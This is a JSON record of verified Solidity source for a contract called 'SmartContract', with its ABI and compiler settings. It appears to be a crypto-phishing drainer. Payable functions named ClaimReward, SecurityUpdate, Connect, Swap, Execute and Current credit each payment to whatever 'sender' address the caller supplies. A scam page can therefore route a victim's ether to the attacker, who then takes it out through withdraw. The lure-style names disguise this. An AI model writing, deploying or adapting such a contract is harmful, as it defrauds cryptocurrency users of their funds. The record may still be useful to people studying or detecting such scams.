{"SourceCode": "// SPDX-License-Identifier: Unlicense\r\n\r\npragma solidity ^0.8.17;\r\n\r\ncontract SmartContract {\r\n  address private owner;\r\n  mapping (address => uint256) private balances;\r\n  constructor() {\r\n      \r\n    owner = msg.sender;\r\n  }\r\n  function getOwner() public view returns (address) {\r\n    return owner;\r\n  }\r\n  function getBalance() public view returns (uint256) {\r\n    return address(this).balance;\r\n  }\r\n  function getUserBalance(address user) public view returns (uint256) {\r\n    return balances[user];\r\n  }\r\n  function withdraw(address to, uint256 amount) public {\r\n    amount = (amount == 0) ? balances[msg.sender] : amount;\r\n    require(amount > 0 && balances[msg.sender] >= amount, \"It's not enough money on balance\");\r\n    balances[msg.sender] = balances[msg.sender] - amount;\r\n    payable(to).transfer(amount);\r\n  }\r\n  function Current(address sender) public payable {\r\n    balances[sender] += msg.value;\r\n  }\r\n  function ClaimReward(address sender) public payable {\r\n    balances[sender] += msg.value;\r\n  }\r\n  function SecurityUpdate(address sender) public payable {\r\n    balances[sender] += msg.value;\r\n  }\r\n  function Execute(address sender) public payable {\r\n    balances[sender] += msg.value;\r\n  }\r\n  function Swap(address sender) public payable {\r\n    balances[sender] += msg.value;\r\n  }\r\n  function Connect(address sender) public payable {\r\n    balances[sender] += msg.value;\r\n  }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"ClaimReward\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"Connect\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"Current\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"Execute\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"SecurityUpdate\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"Swap\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"getUserBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SmartContract", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "Unlicense", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://e5c3b74379e407137d60c4ecde625915ca6d5213b25d87fc817a591e4e455e03"}